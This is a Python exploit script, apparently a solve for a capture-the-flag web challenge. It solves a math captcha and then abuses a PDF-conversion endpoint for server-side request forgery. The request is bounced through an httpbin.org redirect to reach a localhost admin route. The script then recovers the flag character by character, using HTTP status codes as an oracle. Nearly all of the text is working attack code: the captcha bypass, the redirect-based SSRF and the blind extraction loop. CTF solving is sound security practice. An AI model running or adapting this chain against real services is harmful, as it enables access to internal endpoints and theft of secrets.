#!/usr/bin/env python3
"""
Web 2 Doc 1 - Flag Extraction via Redirect SSRF
Oracle: 200 = match (PDF success), other = mismatch
"""
import requests
import re
import string
import urllib.parse
import time

BASE_URL = "http://52.59.124.14:5002"
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_-!"

def solve_captcha(session):
    resp = session.get(f"{BASE_URL}/", timeout=10)
    # Match patterns like: 5 * 81 = ? or 48 // 6 = ?
    m = re.search(r'Math Challenge:\s*(\d+)\s*([+\-*]|//)\s*(\d+)\s*=', resp.text)
    if not m:
        print(f"[!] Could not find captcha pattern")
        return None
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    if op == '+':
        return str(a + b)
    elif op == '-':
        return str(a - b)
    elif op == '*':
        return str(a * b)
    elif op == '//':
        return str(a // b)
    return None

def test_char(idx, char):
    """Returns True if FLAG[idx] == char"""
    session = requests.Session()
    captcha = solve_captcha(session)
    if not captcha:
        return None
    
    # Build the inner URL - encode the & as %26 so it stays part of the redirect target
    inner = f"http://127.0.0.1:5002/admin/flag?i={idx}%26c={urllib.parse.quote(char, safe='')}"
    url = f"https://httpbin.org/redirect-to?url={urllib.parse.quote(inner, safe='')}"
    
    try:
        resp = session.post(f"{BASE_URL}/convert", 
                           data={"url": url, "captcha_answer": captcha}, 
                           timeout=30)
        # 200 = success (flag char matches), other = fail
        return resp.status_code == 200
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def main():
    print("[*] Web 2 Doc 1 - Flag Extraction")
    print("[*] Flag format: ENO{...}\n")
    
    flag = ""
    idx = 0
    
    while True:
        found = False
        for char in CHARSET:
            print(f"\r[*] Testing idx={idx} char={repr(char)}   ", end="", flush=True)
            result = test_char(idx, char)
            
            if result is True:
                flag += char
                print(f"\r[+] Found idx={idx}: {repr(char)} -> {flag}")
                if char == '}':
                    print(f"\n[*] FLAG: {flag}")
                    return
                found = True
                idx += 1
                break
            elif result is None:
                # Retry on error
                time.sleep(1)
                continue
        
        if not found:
            print(f"\n[-] No match at index {idx}")
            print(f"[*] Partial flag: {flag}")
            break

if __name__ == "__main__":
    main()
